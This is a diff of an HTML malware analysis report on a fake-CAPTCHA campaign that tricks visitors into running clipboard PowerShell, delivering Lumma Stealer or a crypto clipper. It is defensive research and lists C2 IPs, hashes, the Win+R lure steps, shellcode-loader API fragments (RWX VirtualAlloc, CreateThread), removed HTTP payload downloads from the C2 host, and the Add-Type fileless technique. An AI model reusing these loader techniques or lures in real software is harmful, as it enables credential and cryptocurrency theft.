@@ -3,13 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Malware Analysis Report - Fake CAPTCHA Info Stealer Campaign</title>
+    <title>Malware Analysis Report - Fake CAPTCHA Multi-Payload Campaign</title>
     <style>
         :root {
             --primary: #0a0a0f;
             --secondary: #12121a;
             --accent: #00ff88;
             --accent2: #ff3366;
+            --accent3: #ffaa00;
             --text: #e0e0e0;
             --text-muted: #888;
             --code-bg: #1a1a24;
@@ -28,7 +29,6 @@
         
         .container { max-width: 1100px; margin: 0 auto; padding: 20px; }
         
-        /* Header */
         header {
             background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
             border-bottom: 2px solid var(--accent);
@@ -56,10 +56,10 @@
         }
         
         header h1 span { color: var(--accent); font-weight: 600; }
+        header h1 .highlight2 { color: var(--accent2); font-weight: 600; }
         
         .subtitle { color: var(--text-muted); font-size: 1.1em; }
         
-        /* Meta Grid */
         .meta-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
@@ -91,8 +91,8 @@
         
         .meta-item .value.danger { color: var(--accent2); }
         .meta-item .value.success { color: var(--accent); }
+        .meta-item .value.warning { color: var(--accent3); }
         
-        /* Sections */
         section {
             background: var(--card-bg);
             border: 1px solid var(--border);
@@ -123,6 +123,8 @@
             font-size: 0.85em;
         }
         
+        .section-number.danger { background: var(--accent2); color: white; }
+        
         .section-header h2 {
             font-size: 1.1em;
             font-weight: 600;
@@ -131,7 +133,6 @@
         
         .section-content { padding: 25px; }
         
-        /* Evidence Box */
         .evidence-box {
             background: var(--code-bg);
             border: 1px solid var(--border);
@@ -151,9 +152,9 @@
             color: var(--accent);
         }
         
-        .evidence-header::before {
-            content: '📷';
-        }
+        .evidence-header::before { content: '📷'; }
+        .evidence-header.critical { background: rgba(255,51,102,0.15); color: var(--accent2); }
+        .evidence-header.warning { background: rgba(255,170,0,0.15); color: var(--accent3); }
         
         .evidence-box img {
             width: 100%;
@@ -168,7 +169,6 @@
             border-top: 1px solid var(--border);
         }
         
-        /* Code Blocks */
         .code-block {
             background: var(--code-bg);
             border: 1px solid var(--border);
@@ -195,8 +195,6 @@
             font-family: 'Consolas', 'Monaco', monospace;
             font-size: 0.9em;
             overflow-x: auto;
-            -webkit-overflow-scrolling: touch;
-            overflow-x: auto;
             white-space: pre-wrap;
             word-wrap: break-word;
         }
@@ -210,10 +208,8 @@
             font-size: 0.9em;
         }
         
-        /* Tables */
         .table-wrapper {
             overflow-x: auto;
-            -webkit-overflow-scrolling: touch;
             margin: 15px 0;
         }
         
@@ -241,7 +237,6 @@
         
         tr:hover { background: rgba(255,255,255,0.02); }
         
-        /* Attack Chain */
         .attack-chain {
             background: var(--code-bg);
             border-radius: 8px;
@@ -260,6 +255,9 @@
             border-left: 3px solid var(--accent);
         }
         
+        .chain-stage.final { border-left-color: var(--accent2); }
+        .chain-stage.alt { border-left-color: var(--accent3); }
+        
         .stage-num {
             background: var(--accent2);
             color: white;
@@ -273,15 +271,8 @@
             font-size: 0.85em;
         }
         
-        .stage-info h4 {
-            color: white;
-            margin-bottom: 5px;
-        }
-        
-        .stage-info p {
-            color: var(--text-muted);
-            font-size: 0.9em;
-        }
+        .stage-info h4 { color: white; margin-bottom: 5px; }
+        .stage-info p { color: var(--text-muted); font-size: 0.9em; }
         
         .stage-arrow {
             text-align: center;
@@ -290,7 +281,14 @@
             padding: 5px 0;
         }
         
-        /* IOC Table */
+        .stage-fork {
+            text-align: center;
+            color: var(--accent3);
+            font-size: 1em;
+            padding: 10px 0;
+            font-weight: bold;
+        }
+        
         .ioc-value {
             font-family: 'Consolas', monospace;
             background: rgba(255,51,102,0.15);
@@ -300,7 +298,16 @@
             font-size: 0.85em;
         }
         
-        /* Tags */
+        .wallet-value {
+            font-family: 'Consolas', monospace;
+            background: rgba(255,170,0,0.15);
+            color: var(--accent3);
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 0.75em;
+            word-break: break-all;
+        }
+        
         .tag {
             display: inline-block;
             padding: 3px 10px;
@@ -312,8 +319,8 @@
         .tag-danger { background: rgba(255,51,102,0.2); color: var(--accent2); }
         .tag-success { background: rgba(0,255,136,0.2); color: var(--accent); }
         .tag-warning { background: rgba(255,193,7,0.2); color: #ffc107; }
+        .tag-russian { background: rgba(66,133,244,0.2); color: #4285f4; }
         
-        /* Highlight Box */
         .highlight-box {
             background: linear-gradient(135deg, rgba(0,255,136,0.05) 0%, rgba(255,51,102,0.05) 100%);
             border: 1px solid var(--accent);
@@ -328,7 +335,12 @@
             font-size: 1em;
         }
         
-        /* Stealer Grid */
+        .highlight-box.critical { border-color: var(--accent2); }
+        .highlight-box.critical h3 { color: var(--accent2); }
+        
+        .highlight-box.warning { border-color: var(--accent3); }
+        .highlight-box.warning h3 { color: var(--accent3); }
+        
         .stealer-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
@@ -347,7 +359,6 @@
         
         .stealer-item .icon { font-size: 1.3em; margin-bottom: 5px; }
         
-        /* Executive Summary */
         .exec-summary {
             background: linear-gradient(135deg, rgba(255,51,102,0.1) 0%, rgba(0,0,0,0) 100%);
             border-left: 4px solid var(--accent2);
@@ -358,13 +369,36 @@
             color: white;
             padding: 15px 25px;
             border-radius: 6px;
-            font-size: 1.2em;
+            font-size: 1.1em;
             font-weight: 600;
             text-align: center;
             margin: 20px 0;
         }
         
-        /* Story Section */
+        .dual-verdict {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .verdict-item {
+            padding: 15px;
+            border-radius: 6px;
+            text-align: center;
+            font-weight: 600;
+        }
+        
+        .verdict-item.stealer {
+            background: var(--accent2);
+            color: white;
+        }
+        
+        .verdict-item.clipper {
+            background: var(--accent3);
+            color: black;
+        }
+        
         .story-text {
             font-size: 1.05em;
             line-height: 1.8;
@@ -373,7 +407,56 @@
         
         .story-text p { margin-bottom: 15px; }
         
-        /* Footer */
+        .crypto-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 10px;
+            margin: 15px 0;
+        }
+        
+        .crypto-item {
+            background: var(--secondary);
+            padding: 10px 12px;
+            border-radius: 6px;
+            border: 1px solid var(--border);
+            font-size: 0.8em;
+        }
+        
+        .crypto-item .name {
+            color: var(--accent3);
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .crypto-item .address {
+            font-family: 'Consolas', monospace;
+            color: var(--text-muted);
+            word-break: break-all;
+            font-size: 0.85em;
+        }
+        
+        .flow-diagram {
+            background: var(--code-bg);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .flow-step {
+            display: inline-block;
+            background: var(--secondary);
+            padding: 10px 15px;
+            border-radius: 6px;
+            margin: 5px;
+            border: 1px solid var(--border);
+        }
+        
+        .flow-arrow {
+            color: var(--accent);
+            margin: 0 10px;
+        }
+        
         footer {
             text-align: center;
             padding: 40px 20px;
@@ -382,65 +465,32 @@
             font-size: 0.85em;
         }
         
-        /* Print Styles */
         @media print {
             body { background: white; color: black; }
             .evidence-box img { max-height: 400px; object-fit: contain; }
         }
         
-        /* Mobile Responsive Styles */
         @media screen and (max-width: 768px) {
             .container { padding: 10px; }
-            
             header { padding: 30px 15px; }
             header h1 { font-size: 1.5em; }
             .subtitle { font-size: 0.95em; }
-            
-            /* Make tables scrollable on mobile */
-            .table-wrapper {
-                overflow-x: auto;
-                -webkit-overflow-scrolling: touch;
-                margin: 15px 0;
-            }
-            
-            table {
-                min-width: 500px;
-                font-size: 0.85em;
-            }
-            
-            th, td {
-                padding: 8px 10px;
-                white-space: nowrap;
-            }
-            
-            /* Code blocks */
+            .table-wrapper { overflow-x: auto; }
+            table { min-width: 500px; font-size: 0.85em; }
+            th, td { padding: 8px 10px; white-space: nowrap; }
             .code-block { font-size: 0.8em; }
-            .code-content { 
-                overflow-x: auto;
-                white-space: pre;
-            }
-            
-            /* Section headers */
+            .code-content { overflow-x: auto; white-space: pre; }
             .section-header h2 { font-size: 1.3em; }
-            
-            /* Evidence boxes */
             .evidence-box { margin: 15px 0; }
             .evidence-caption { font-size: 0.85em; }
-            
-            /* Highlight boxes */
             .highlight-box { padding: 15px; }
             .highlight-box h3 { font-size: 1em; }
-            
-            /* Tags */
             .tag { font-size: 0.7em; padding: 3px 8px; }
-            
-            /* IOC values */
             .ioc-value { font-size: 0.75em; word-break: break-all; }
-            
-            /* Meta grid */
             .meta-grid { grid-template-columns: repeat(2, 1fr); }
             .meta-item { padding: 12px; }
             .meta-item .value { font-size: 0.95em; }
+            .dual-verdict { grid-template-columns: 1fr; }
         }
         
         @media screen and (max-width: 480px) {
@@ -454,19 +504,19 @@
 <body>
     <header>
         <div class="report-badge">MALWARE ANALYSIS REPORT</div>
-        <h1>Fake CAPTCHA <span>Info Stealer</span> Campaign</h1>
-        <p class="subtitle">Multi-Stage Fileless Attack Targeting Charity Payment Pages</p>
+        <h1>Fake CAPTCHA <span>Multi-Payload</span> Campaign</h1>
+        <p class="subtitle">Modular 5-Stage Fileless Attack: Info Stealer + Cryptocurrency Clipboard Hijacker</p>
     </header>
     
     <div class="container">
         <div class="meta-grid">
             <div class="meta-item">
                 <div class="label">Analysis Date</div>
-                <div class="value">February 8, 2026</div>
+                <div class="value">February 2026</div>
             </div>
             <div class="meta-item">
                 <div class="label">Malware Type</div>
-                <div class="value danger">Info Stealer</div>
+                <div class="value danger">Dual Payload</div>
             </div>
             <div class="meta-item">
                 <div class="label">Campaign Status</div>
@@ -481,15 +531,15 @@
                 <div class="value">Fileless (Memory)</div>
             </div>
             <div class="meta-item">
-                <div class="label">Exfiltration</div>
-                <div class="value">Telegram Bot</div>
+                <div class="label">Origin</div>
+                <div class="value warning">Russian</div>
             </div>
         </div>
 
         <!-- Executive Summary -->
         <section class="exec-summary">
             <div class="section-header">
-                <div class="section-number">!</div>
+                <div class="section-number danger">!</div>
                 <h2>Executive Summary</h2>
             </div>
             <div class="section-content">
@@ -506,14 +556,28 @@
                         technique to execute a malicious PowerShell command that had been silently copied to the clipboard.
                     </p>
                     <p>
-                        Recognizing the suspicious nature of this "verification," the command was not executed. Instead, 
-                        a full malware analysis was conducted in an isolated environment, revealing a <strong>multi-stage 
-                        info stealer</strong> operation using Donut shellcode for fileless execution and Telegram for data exfiltration.
+                        <strong>Key Discovery:</strong> This campaign operates a <strong>modular C2 infrastructure</strong> that 
+                        dynamically serves different final payloads. During analysis, two distinct malware families were observed:
+                    </p>
+                    <ul style="margin: 15px 0 15px 30px; line-height: 2;">
+                        <li><strong>Lumma Stealer</strong> (cs.bin) — A native C/C++ info stealer targeting browsers, crypto wallets, and messaging apps</li>
+                        <li><strong>Cryptocurrency Clipboard Hijacker</strong> (clipx64.bin) — A Marte-family clipper with 17 hardcoded attacker wallets</li>
+                    </ul>
+                    <p>
+                        Reverse engineering using Ghidra revealed the clipboard hijacker contains code to <strong>exclude Russian victims</strong> 
+                        by checking for keyboard layout <code>0x419</code> (Russian), strongly indicating Russian origin.
                     </p>
                 </div>
                 
-                <div class="verdict-box">
-                    VERDICT: .NET INFO STEALER WITH TELEGRAM EXFILTRATION
+                <div class="dual-verdict">
+                    <div class="verdict-item stealer">
+                        PAYLOAD A: LUMMA INFO STEALER<br>
+                        <span style="font-size: 0.8em; font-weight: normal;">Telegram Exfiltration</span>
+                    </div>
+                    <div class="verdict-item clipper">
+                        PAYLOAD B: CRYPTO CLIPBOARD HIJACKER<br>
+                        <span style="font-size: 0.8em; font-weight: normal;">17 Attacker Wallets</span>
+                    </div>
                 </div>
             </div>
         </section>
@@ -539,9 +603,7 @@
                     </div>
                 </div>
                 
-                <p>
-                    The CAPTCHA instructed users to perform the following steps:
-                </p>
+                <p>The CAPTCHA instructed users to perform the following steps:</p>
                 <ol style="margin-left: 20px; margin: 15px 0 15px 30px;">
                     <li>Press <code>Win + R</code> to open the Run dialog</li>
                     <li>Press <code>Ctrl + V</code> to paste the command</li>
@@ -611,11 +673,20 @@
                 </div>
                 
                 <div class="evidence-box">
-                    <div class="evidence-header">Evidence 3: Stage 1 Dropper - Raw Payload Extracted</div>
+                    <div class="evidence-header">Evidence 3: Stage 1 Dropper - Raw Payload</div>
                     <img src="03-stage1-dropper-payload.png" alt="Stage 1 Payload">
                     <div class="evidence-caption">
-                        The raw Stage 1 dropper script showing social engineering message "Wait please, don't close this window..." 
-                        and the hidden PowerShell process launch to download Stage 2 from 178.16.53.70.
+                        Stage 1 dropper script showing social engineering message "Wait please, don't close this window..." 
+                        and hidden PowerShell process launch to download Stage 2 from 178.16.53.70.
+                    </div>
+                </div>
+
+                <div class="evidence-box">
+                    <div class="evidence-header">Evidence: PowerShell Window with Social Engineering Message</div>
+                    <img src="24-powershell-social-engineering.png" alt="PowerShell Window">
+                    <div class="evidence-caption">
+                        The PowerShell window displays "Wait please, don't close this window" to keep victims waiting 
+                        while malware downloads and executes in the background.
                     </div>
                 </div>
                 
@@ -629,14 +700,13 @@
                     <div class="evidence-header">Evidence 4: Stage 2 Shellcode Loader</div>
                     <img src="04-stage2-shellcode-loader.png" alt="Stage 2 Payload">
                     <div class="evidence-caption">
-                        Stage 2 payload showing the shellcode loader code. Key values: <code>$p = 0x40</code> (PAGE_EXECUTE_READWRITE = RWX permission), 
+                        Stage 2 payload showing shellcode loader. Key values: <code>$p = 0x40</code> (PAGE_EXECUTE_READWRITE), 
                         <code>$m1 = 0x1000</code> (MEM_COMMIT), <code>$m2 = 0x2000</code> (MEM_RESERVE). 
-                        Uses CreateThread for fileless in-memory execution of downloaded cptch.bin from 94.154.35.115.
+                        Uses CreateThread for fileless in-memory execution.
                     </div>
                 </div>
                 
                 <h3 style="color: var(--accent); margin-top: 25px;">Key Techniques Summary (Stage 1 & 2)</h3>
-                <p>The following table summarizes the evasion and execution techniques used across both PowerShell stages:</p>
                 <div class="table-wrapper"><table>
                     <tr>
                         <th>Stage</th>
@@ -666,25 +736,19 @@
                         <td>2</td>
                         <td>Memory Allocation</td>
                         <td><code>VirtualAlloc($s, 0x3000, 0x40)</code></td>
-                        <td>RWX memory (0x40 = PAGE_EXECUTE_READWRITE)</td>
+                        <td>RWX memory for shellcode</td>
                     </tr>
                     <tr>
                         <td>2</td>
                         <td>Shellcode Copy</td>
                         <td><code>Marshal::Copy($b, 0, $addr, $s)</code></td>
-                        <td>Copy payload bytes to allocated memory</td>
+                        <td>Copy payload to allocated memory</td>
                     </tr>
                     <tr>
                         <td>2</td>
                         <td>Thread Creation</td>
                         <td><code>CreateThread</code></td>
                         <td>Execute shellcode in new thread</td>
-                    </tr>
-                    <tr>
-                        <td>2</td>
-                        <td>Wait for Execution</td>
-                        <td><code>WaitForSingleObject($th, 30000)</code></td>
-                        <td>Wait 30 seconds for shellcode completion</td>
                     </tr>
                 </table></div>
             </div>
@@ -722,11 +786,10 @@ SHA256          35EC1234DA4E6433A797E5BA719E3A6B2CB455A8C3815601074B3FEF7BBC9B39
                 </div>
                 
                 <div class="evidence-box">
-                    <div class="evidence-header">Evidence 6: Newly Identified Campaign</div>
+                    <div class="evidence-header">Evidence 6: First Submission - Active Campaign</div>
                     <img src="06-virustotal-first-submission.png" alt="First Submission">
                     <div class="evidence-caption">
-                        First submission to VirusTotal on February 8, 2026 indicates this is a newly identified campaign. 
-                        Combined with live C2 server verification (Section 8), this confirms active threat status.
+                        First submission to VirusTotal confirms this is a newly identified, actively running campaign.
                     </div>
                 </div>
             </div>
@@ -740,69 +803,90 @@ SHA256          35EC1234DA4E6433A797E5BA719E3A6B2CB455A8C3815601074B3FEF7BBC9B39
             </div>
             <div class="section-content">
                 <p>
-                    The shellcode was executed in an isolated VM with Process Monitor and Wireshark monitoring. 
-                    The malware was observed connecting to its C2 server and downloading additional payloads.
+                    The full attack chain was executed in an isolated VM with Process Monitor and Wireshark monitoring. 
+                    This revealed the <strong>modular nature</strong> of the campaign — the C2 server dynamically serves 
+                    different final payloads.
                 </p>
                 
-                <h3 style="color: var(--accent);">Execution Command</h3>
-                <div class="code-block">
-                    <div class="code-header">Shellcode Loader Execution</div>
-                    <div class="code-content"># Using custom shellcode loader
-.\loader.exe cptch.bin</div>
-                </div>
-                
                 <div class="evidence-box">
-                    <div class="evidence-header">Evidence 7: Process Monitor - C2 Connection Captured</div>
+                    <div class="evidence-header">Evidence 7: Process Monitor - Network Traffic Capture</div>
                     <img src="07-procmon-c2-network-traffic.png" alt="Procmon Network">
                     <div class="evidence-caption">
-                        Process Monitor capturing loader.exe establishing TCP connection to 94.154.35.115:80 (HTTP), 
+                        Process Monitor capturing the attack establishing TCP connections to C2 servers, 
                         showing TCP Connect, Send, and multiple Receive operations.
                     </div>
                 </div>
-                
-                <h3 style="color: var(--accent); margin-top: 20px;">Wireshark Analysis</h3>
-                <p>
-                    Network traffic captured in Wireshark revealed HTTP requests downloading additional payloads:
-                </p>
-                
+
                 <div class="evidence-box">
-                    <div class="evidence-header">Evidence 8: Wireshark HTTP Export - cptchbuild.bin</div>
-                    <img src="08-wireshark-cptchbuild-download.png" alt="Wireshark HTTP">
+                    <div class="evidence-header">Evidence: Process Tree - Full Attack Flow</div>
+                    <img src="19-process-tree-attack-flow.png" alt="Process Tree">
+                    <div class="evidence-caption">
+                        Process tree showing the complete execution flow: PowerShell spawning child processes 
+                        for shellcode execution and payload delivery.
+                    </div>
+                </div>
+                
+                <h3 style="color: var(--accent); margin-top: 20px;">Wireshark - Payload Downloads</h3>
+
+                <div class="evidence-box">
+                    <div class="evidence-header">Evidence 8: HTTP Export - cptchbuild.bin Download</div>
+                    <img src="08-wireshark-cptchbuild-download.png" alt="Wireshark cptchbuild">
                     <div class="evidence-caption">
                         HTTP traffic showing the malware downloading cptchbuild.bin (186 KB) from the C2 server.
                     </div>
                 </div>
                 
                 <div class="evidence-box">
-                    <div class="evidence-header">Evidence 9: Wireshark - Additional Payload cs.bin</div>
-                    <img src="09-wireshark-csbin-download.png" alt="Wireshark cs.bin">
+                    <div class="evidence-header warning">Evidence 9: Alternative Payload Discovered - clipx64.bin</div>
+                    <img src="15-wireshark-clipx64-download.png" alt="Wireshark clipx64">
                     <div class="evidence-caption">
-                        Second HTTP request downloading cs.bin (84 KB), revealing the multi-payload nature of this attack.
+                        <strong>Key Discovery:</strong> During live execution, the C2 served <code>clipx64.bin</code> (67 KB) 
+                        instead of <code>cs.bin</code>. This revealed the campaign's modular payload system.
+                    </div>
+                </div>
+
+                <div class="evidence-box">
+                    <div class="evidence-header">Evidence: HTTP Download Flow Summary</div>
+                    <img src="16-http-payload-downloads.png" alt="HTTP Downloads">
+                    <div class="evidence-caption">
+                        Summary of HTTP requests showing the sequential download of payloads from the C2 server.
+                    </div>
+                </div>
+
+                <div class="evidence-box">
+                    <div class="evidence-header">Evidence: Network Activity Flow</div>
+                    <img src="17-network-activity-flow.png" alt="Network Flow">
+                    <div class="evidence-caption">
+                        Chronological network activity showing connections to multiple C2 servers during execution.
                     </div>
                 </div>
                 
-                <h3 style="color: var(--accent); margin-top: 20px;">Captured HTTP Traffic</h3>
-                <div class="code-block">
-                    <div class="code-header">HTTP Requests Observed</div>
-                    <div class="code-content">GET /user_profiles_photo/cptchbuild.bin HTTP/1.1
-Connection: Keep-Alive
-User-Agent: Mozilla/5.0
-Host: 94.154.35.115
-
-HTTP/1.1 200 
-Content-Type: application/octet-stream
-Content-Length: 186955
-
----
-
-GET /user_profiles_photo/cs.bin HTTP/1.1
-Connection: Keep-Alive
-User-Agent: Mozilla/5.0
-Host: 94.154.35.115
-
-HTTP/1.1 200 
-Content-Type: application/octet-stream
-Content-Length: 84043</div>
+                <div class="highlight-box warning">
+                    <h3>Modular C2 Infrastructure</h3>
+                    <p>
+                        The campaign operates a <strong>modular payload system</strong>. The same infection chain delivers 
+                        different final payloads based on C2 configuration. Two distinct payloads were observed:
+                    </p>
+                    <table style="margin-top: 15px;">
+                        <tr>
+                            <th>Payload</th>
+                            <th>Type</th>
+                            <th>Size</th>
+                            <th>Purpose</th>
+                        </tr>
+                        <tr>
+                            <td><code>cs.bin</code></td>
+                            <td>Lumma Stealer</td>
+                            <td>84 KB</td>
+                            <td>Info theft, Telegram exfil</td>
+                        </tr>
+                        <tr>
+                            <td><code>clipx64.bin</code></td>
+                            <td>Crypto Clipper</td>
+                            <td>67 KB</td>
+                            <td>Cryptocurrency theft</td>
+                        </tr>
+                    </table>
                 </div>
             </div>
         </section>
@@ -811,53 +895,35 @@ Content-Length: 84043</div>
         <section>
             <div class="section-header">
                 <div class="section-number">5</div>
-                <h2>Memory Dump Analysis - Info Stealer Confirmed</h2>
+                <h2>Memory Dump Analysis - Stealer Indicators</h2>
             </div>
             <div class="section-content">
                 <p>
-                    Memory dumps were captured using ProcDump to extract the decrypted payloads from memory. 
-                    <strong>Two separate dumps</strong> were analyzed to validate findings and establish relationships 
-                    between the payload stages:
-                </p>
-                <ul style="margin: 15px 0 15px 30px;">
-                    <li><code>dump_cptch.dmp</code> — Memory dump during cptch.bin execution</li>
-                    <li><code>dump_cptchbuild.dmp</code> — Memory dump during cptchbuild.bin execution (contains decrypted stealer)</li>
-                </ul>
-                <p>
-                    String analysis of both dumps revealed clear indicators of an information stealer targeting browsers, 
-                    crypto wallets, and messaging applications.
+                    Memory dumps were captured using ProcDump to extract decrypted payloads from memory. 
+                    String analysis revealed clear indicators of information stealer capabilities.
                 </p>
                 
-                <h3 style="color: var(--accent);">Memory Dump Capture</h3>
                 <div class="code-block">
                     <div class="code-header">ProcDump Commands Used</div>
-                    <div class="code-content"># Terminal 1: Wait for process
-.\procdump.exe -accepteula -ma -w loader.exe dump_cptch.dmp
-.\procdump.exe -accepteula -ma -w loader.exe dump_cptchbuild.dmp
-
-# Terminal 2: Execute shellcode
-.\loader.exe cptch.bin
-.\loader.exe cptchbuild.bin
-
-# After capture, terminate process
-taskkill /F /IM loader.exe</div>
+                    <div class="code-content">.\procdump.exe -accepteula -ma -w loader.exe dump_cptch.dmp
+.\procdump.exe -accepteula -ma -w loader.exe dump_cptchbuild.dmp</div>
                 </div>
                 
                 <div class="evidence-box">
-                    <div class="evidence-header">Evidence 10: Memory Analysis - Stealer Indicators Found</div>
-                    <img src="10-memory-strings-stealer-1.png" alt="Stealer Verification 1">
+                    <div class="evidence-header">Evidence 10: Memory Strings - Browser Targets</div>
+                    <img src="10-memory-strings-stealer-1.png" alt="Stealer Strings 1">
                     <div class="evidence-caption">
-                        String extraction from memory dump revealing browser targeting (Chrome, Firefox, Discord) 
+                        String extraction revealing browser targeting (Chrome, Firefox, Discord) 
                         and data theft capabilities (Cookies, Clipboard, Screenshot).
                     </div>
                 </div>
                 
                 <div class="evidence-box">
-                    <div class="evidence-header">Evidence 11: Telegram Exfiltration & Crypto Wallet Targets</div>
-                    <img src="11-memory-strings-stealer-2.png" alt="Stealer Verification 2">
+                    <div class="evidence-header">Evidence 11: Telegram Exfiltration Methods</div>
+                    <img src="11-memory-strings-stealer-2.png" alt="Stealer Strings 2">
                     <div class="evidence-caption">
-                        Additional strings showing Telegram exfiltration functions (SendDocument, SendMessage), 
-                        crypto wallet targeting (Atomic, guarda), and system fingerprinting (MachineGuid, HWID).
+                        Strings showing Telegram exfiltration functions (SendDocument, SendMessage), 
+                        crypto wallet targeting, and system fingerprinting.
                     </div>
                 </div>
                 
@@ -878,233 +944,433 @@ taskkill /F /IM loader.exe</div>
                         <div class="stealer-item"><div class="icon">📸</div>Screenshot</div>
                     </div>
                 </div>
-                
-                <h3 style="color: var(--accent); margin-top: 20px;">Key Strings Extracted</h3>
-                <div class="table-wrapper"><table>
-                    <tr>
-                        <th>Category</th>
-                        <th>Strings Found</th>
-                        <th>Implication</th>
-                    </tr>
-                    <tr>
-                        <td>Telegram Exfil</td>
-                        <td><code>SendDocument</code>, <code>SendMessage</code>, <code>get_Telegrams</code></td>
-                        <td>Data sent to Telegram bot</td>
-                    </tr>
-                    <tr>
-                        <td>Crypto Wallets</td>
-                        <td><code>Atomic</code>, <code>guarda</code>, <code>Wallet</code></td>
-                        <td>Cryptocurrency theft</td>
-                    </tr>
-                    <tr>
-                        <td>Browser Targets</td>
-                        <td><code>Chrome</code>, <code>Firefox</code>, <code>Edge</code>, <code>Opera</code></td>
-                        <td>Browser data theft</td>
-                    </tr>
-                    <tr>
-                        <td>System Profiling</td>
-                        <td><code>MachineGuid</code>, <code>HWID</code>, <code>AntiVirus</code></td>
-                        <td>Victim fingerprinting</td>
-                    </tr>
-                    <tr>
-                        <td>Data Capture</td>
-                        <td><code>Clipboard</code>, <code>Screenshot</code>, <code>Cookies</code></td>
-                        <td>Active data theft</td>
-                    </tr>
-                </table></div>
             </div>
         </section>
 
-        <!-- Section 6: cs.bin Deep Analysis -->
+        <!-- Section 6: Fileless Execution Technique -->
         <section>
             <div class="section-header">
                 <div class="section-number">6</div>
-                <h2>cs.bin Deep Analysis - .NET Stealer Verification</h2>
+                <h2>Fileless Execution Technique - .NET Compilation</h2>
             </div>
             <div class="section-content">
                 <p>
-                    The final payload <code>cs.bin</code> was analyzed to verify it contains the .NET info stealer. 
-                    Initial static analysis revealed it is also Donut-wrapped shellcode, with the actual .NET assembly 
-                    encrypted inside.
+                    The attack uses PowerShell's <code>Add-Type</code> cmdlet to achieve fileless execution. 
+                    This technique compiles C# code at runtime, creates a temporary DLL in memory, loads it, 
+                    then deletes the temporary files — leaving no persistent artifacts on disk.
                 </p>
                 
-                <h3 style="color: var(--accent);">Static Analysis</h3>
-                <div class="code-block">
-                    <div class="code-header">cs.bin File Analysis</div>
-                    <div class="code-content">PS> Get-Item "C:\MalwareAnalysis\cs.bin" | Select-Object Name, Length
-Name     Length
-----     ------
-cs.bin   84043
-
-PS> Get-FileHash "C:\MalwareAnalysis\cs.bin" -Algorithm SHA256
-Algorithm   Hash
----------   ----
-SHA256      8A1DB4433E20B71698F63199B97C8A94DDA167CB24A169B0FC1092B1FB5E3CE0
-
-PS> $bytes = [System.IO.File]::ReadAllBytes("C:\MalwareAnalysis\cs.bin")
-PS> ($bytes[0..63] | ForEach-Object { '{0:X2}' -f $_ }) -join ' '
-E8 C0 E5 00 00 C0 E5 00 00 DF 3E C3 CB F9 F1 E1...</div>
+                <div class="flow-diagram">
+                    <div class="flow-step">PowerShell<br><small>Add-Type</small></div>
+                    <span class="flow-arrow">→</span>
+                    <div class="flow-step">csc.exe<br><small>C# Compiler</small></div>
+                    <span class="flow-arrow">→</span>
+                    <div class="flow-step">Temp .DLL<br><small>Bridge Code</small></div>
+                    <span class="flow-arrow">→</span>
+                    <div class="flow-step">Load & Delete<br><small>Fileless!</small></div>
                 </div>
-                
-                <h3 style="color: var(--accent); margin-top: 20px;">Donut Signature Comparison</h3>
-                <div class="table-wrapper"><table>
-                    <tr>
-                        <th>File</th>
-                        <th>First 5 Bytes</th>
-                        <th>Instruction</th>
-                        <th>Verdict</th>
-                    </tr>
-                    <tr>
-                        <td>cptch.bin</td>
-                        <td><code>E8 C0 6B 00 00</code></td>
-                        <td>CALL +0x6BC0</td>
-                        <td><span class="tag tag-danger">Donut</span></td>
-                    </tr>
-                    <tr>
-                        <td>cs.bin</td>
-                        <td><code>E8 C0 E5 00 00</code></td>
-                        <td>CALL +0xE5C0</td>
-                        <td><span class="tag tag-danger">Donut</span></td>
-                    </tr>
-                </table></div>
-                <p style="margin-top: 10px; color: var(--text-muted); font-size: 0.9em;">
-                    Both files start with <code>E8</code> (x86 CALL instruction) — the characteristic Donut shellcode signature.
-                </p>
-                
-                <h3 style="color: var(--accent); margin-top: 25px;">VirusTotal Confirmation</h3>
-                <p>
-                    Submitting cs.bin to VirusTotal confirmed it as <strong>Donut/Marte</strong> family malware:
-                </p>
-                
+
                 <div class="evidence-box">
-                    <div class="evidence-header">Evidence: cs.bin VirusTotal Analysis</div>
-                    <img src="13-csbin-virustotal-marte.png" alt="cs.bin VirusTotal">
+                    <div class="evidence-header">Evidence: Attack Compilation Flow</div>
+                    <img src="21-dotnet-compilation-flow.png" alt="Compilation Flow">
                     <div class="evidence-caption">
-                        VirusTotal detection for cs.bin showing Donut/Marte family classification with multiple AV engines 
-                        identifying it as Trojan.Donut shellcode containing encrypted malware payload.
+                        Process Monitor showing the .NET compilation flow: PowerShell calls Add-Type, 
+                        which invokes csc.exe (C# compiler) to create temporary DLL files.
                     </div>
                 </div>
+                
+                <div class="evidence-box">
+                    <div class="evidence-header">Evidence: Temporary DLL Creation in Procmon</div>
+                    <img src="22-procmon-temp-dll-creation.png" alt="DLL Creation">
+                    <div class="evidence-caption">
+                        Procmon capturing the creation of temporary .cmdline and .dll files in %TEMP%. 
+                        These files are created, loaded into memory, then immediately deleted.
+                    </div>
+                </div>
+
+                <div class="evidence-box">
+                    <div class="evidence-header">Evidence: Malicious Bridge DLL Detection</div>
+                    <img src="23-procmon-malicious-dll-detected.png" alt="Dropped DLL">
+                    <div class="evidence-caption">
+                        The temporary DLL file (containing VirtualAlloc/CreateThread API declarations) 
+                        is detected as malicious. This DLL acts as a bridge to enable shellcode execution.
+                    </div>
+                </div>
+                
+                <h3 style="color: var(--accent); margin-top: 20px;">How It Works</h3>
+                <div class="table-wrapper"><table>
+                    <tr>
+                        <th>Step</th>
+                        <th>Process</th>
+                        <th>Action</th>
+                        <th>Result</th>
+                    </tr>
+                    <tr>
+                        <td>1</td>
+                        <td>PowerShell</td>
+                        <td><code>Add-Type</code> with C# code</td>
+                        <td>Triggers .NET compilation</td>
+                    </tr>
+                    <tr>
+                        <td>2</td>
+                        <td>csc.exe</td>
+                        <td>Compiles C# → .cmdline file</td>
+                        <td>Temp source in %TEMP%</td>
+                    </tr>
